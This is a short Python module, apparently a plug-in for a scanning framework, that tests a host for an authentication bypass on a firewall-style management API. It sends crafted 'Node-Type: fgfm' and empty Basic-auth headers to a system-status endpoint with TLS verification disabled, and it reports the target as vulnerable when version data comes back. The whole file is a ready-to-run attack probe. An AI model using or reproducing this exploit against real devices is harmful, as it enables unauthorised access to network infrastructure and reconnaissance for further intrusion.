import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
REQUIRED_OPTIONS = {"URL": ""}


def execute(options):
    target = options.get("URL")
    port = 443

    url = f"https://{target}:{port}/api/v2/monitor/system/status"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Node-Id": "1",
        "Node-Type": "fgfm",
        "Authorization": "Basic Og==",
    }

    try:
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and "version" in response.text.lower():
            print(f"{'='*40}")
            print(f"[!] VULNERABLE: {target}")
            print(
                f"[+] System Info: {response.json().get('results', {}).get('version', 'N/A')}"
            )
            print(f"{'='*40}")
        else:
            print("[-] Target not vulnerable or patched.")

    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f"[-] GLOBAL ERROR: {e}")
